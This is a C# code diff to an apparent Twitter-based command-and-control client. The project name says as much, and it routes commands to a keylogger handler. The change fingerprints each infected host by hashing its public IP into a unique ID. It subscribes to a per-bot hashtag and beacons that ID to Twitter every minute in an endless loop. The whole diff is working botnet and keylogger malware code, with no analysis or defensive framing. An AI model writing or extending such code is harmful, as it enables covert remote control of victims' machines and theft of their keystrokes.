@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -13,6 +14,7 @@ namespace TwitterCommandAndControl.Test
     {
         static void Main(string[] args)
         {
+            var uniqueID = Convert.ToBase64String(SHA256Managed.Create().ComputeHash(ASCIIEncoding.UTF8.GetBytes(GetPublicIP.GetIP())));
             var hashTag = "#TwitterCommandAndControl";
 
             Console.WriteLine("Starting Tracker");
@@ -27,17 +29,22 @@ namespace TwitterCommandAndControl.Test
                     KeyLoggerHandler.Respond(x);
                 });
             }, 
-            track: hashTag, 
+            track: hashTag + ",#" + uniqueID, 
             log: Console.Out);
             
             while (!tracker.IsActive) ;
             Console.WriteLine("Tracker Active");
 
-            Messenger.Send(hashTag + " test");
-            
-            Console.WriteLine("Press Any Key To Exit");
+            Console.WriteLine("Signaling");
 
-            Console.ReadKey();
+            Task.Run(() =>
+            {
+                while (tracker.IsActive)
+                {
+                    Messenger.Send(hashTag + " #unique=" + uniqueID);
+                    Thread.Sleep(60000);
+                }
+            }).Wait();
 
             //tracker.Wait();
         }
